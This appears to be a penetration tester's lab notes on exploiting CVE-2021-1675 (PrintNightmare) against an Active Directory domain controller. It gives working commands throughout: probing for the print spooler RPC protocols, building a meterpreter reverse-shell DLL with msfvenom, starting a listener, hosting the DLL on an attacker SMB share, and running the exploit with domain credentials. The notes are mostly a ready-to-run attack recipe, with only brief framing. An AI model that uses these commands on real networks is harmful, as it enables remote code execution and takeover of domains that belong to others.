-- -
#CVE-2021-1675 abusing the print spooler and a valid ad account to take over domain. We will be using cube0x0 rce found [here](https://github.com/cube0x0/CVE-2021-1675) This is closer to a kernel level exploit that can destabilize the DC/domain/network, so use sparingly. 
#### Check for vuln
```bash
rpcdump.py @<dc ip> | egrep "MS-RPRN|MS-PAR"

# Looking for the following output
# Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
# Protocol: [MS-RPRN]: Print System Remote Protocol
```
#### Installation
```bash
# uninstall current impacket insstall, which I wouldn't recommend
pip3 uninstall impacket

# rather use a venv
python3 -m venv .venv
source .venv/bin/activate

# Then continue from here
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
#### Exploit
```bash
# make your payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9001 -f dll > shell.dll 

# Setup listener
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp 
set LHOST 10.0.2.15
set LPORT 9001
run

# host malicious dll, in the same dir as shell.dll:
impacket-smbserver share 'pwd' -smb2support

# run exploit
python CVE-2021-1675.py <domain>/<user>:<password>@<dc ip> '\\<attack ip>\smb\shell.dll'

python CVE-2021-1675.py MARVEL.local/fcastle:Password1@10.0.2.16 '\\10.0.2.15\smb\shell.dll'
```